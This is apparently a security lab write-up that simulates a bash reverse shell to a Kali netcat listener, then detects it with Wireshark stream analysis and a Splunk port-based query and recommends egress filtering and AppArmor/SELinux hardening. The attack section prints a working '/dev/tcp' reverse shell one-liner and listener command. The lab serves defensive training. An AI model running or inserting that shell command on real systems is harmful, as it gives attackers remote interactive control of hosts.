# Project 3: Outbound Reverse Shell Persistence Tracking & Packet Forensic Analysis

## 1. Executive Summary & Objective
This laboratory simulates a post-exploitation phase where an attacker establishes a malicious outbound reverse shell from an compromised internal Linux server to an external Command and Control (C2) node. The defensive objective is to analyze raw network packet captures (`.pcap`) via Wireshark, isolate anomalous unencrypted data payloads passing over non-standard operational management ports, and build signature-based detection metrics.

## 2. Lab Architecture & Sandbox Topology
*   **Attacker Node (External C2):** Kali Linux (IP: `192.168.1.50`) running a backend network listener.
*   **Compromised Enterprise Asset:** Ubuntu Server 22.04 LTS (IP: `192.168.1.100`) initiating an outbound session.
*   **Forensic Triage Tool:** Wireshark Packet Analyzer monitoring the virtual switch interface.

---

## 3. Threat Simulation & Attack Phase
To gain interactive operating system access following an initial exploit, an outbound connection was initiated from the vulnerable enterprise server back to the attacker's infrastructure.

### The Attacker's Listener (Kali Linux):
```bash
nc -lvnp 4444
```
*This starts a Netcat listener on port 4444, waiting silently for an inbound connection.*

### The Malicious Payload Payload (Executed on Target Server):
```bash
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
```
*This command spawns an interactive Linux Bash shell (`bash -i`) and pipes the input, output, and error streams directly across a network socket back to the attacker's IP on port 4444.*

---

## 4. Network Forensic Analysis & Wireshark Triage
Because the standard Netcat payload transmits data in **clear text**, a deep-packet inspection of the transaction reveals the entire interactive terminal session.

### Triage Steps inside Wireshark:
1. **Filtering the Traffic:** To isolate potential unauthorized terminal sessions, filter traffic by looking for connections to common non-standard or high-numbered ports:
   `tcp.port == 4444`
2. **Following the TCP Stream:** Right-click on a matching packet and select **Follow -> TCP Stream**. 
3. **Payload Inspection:** The resulting stream reveals the raw system banners and commands executed by the attacker (e.g., `whoami`, `id`, `cat /etc/passwd`).

### Production Detection SIEM Rule (Splunk SPL Query):
If network connection events or Sysmon for Linux data are aggregated inside a SIEM, this signature isolates active reverse shell behaviors:
```splunk
index=network_logs dest_port=4444 OR dest_port=5555 OR dest_port=8888
| stats count by src_ip, dest_ip, dest_port
| rename src_ip as "Compromised Internal Host", dest_ip as "External Suspicious C2"
```

---

## 5. Defensive Engineering & Remediation Strategy
To systematically prevent and mitigate outbound shell persistence vectors, the following defense-in-depth measures were engineered:
1. **Egress Firewall Filtering (Strict Outbound Whitelisting):** Enterprise firewalls should block all outbound traffic by default. Production servers should only be allowed to communicate outbound to pre-approved destinations over explicitly required ports (e.g., port 443 for official software updates). All unauthorized outbound connection requests must be dropped and alerted on immediately.
2. **Endpoint Application Whitelisting & Hardening:** Use system tools like **AppArmor** or **SELinux** to restrict runtime binaries. For example, standard web applications or non-administrative system users should be completely restricted from spawning interactive components like `/bin/sh` or `/bin/bash`.
3. **Upgrading to Encrypted Listeners:** To simulate advanced persistent threats (APTs) that encrypt their tracking traffic to bypass deep-packet inspection tools, future lab phases will replace standard Netcat utilities with TLS-encrypted reverse shells using tools like **ncat --ssl** or OpenSSL wrappers.
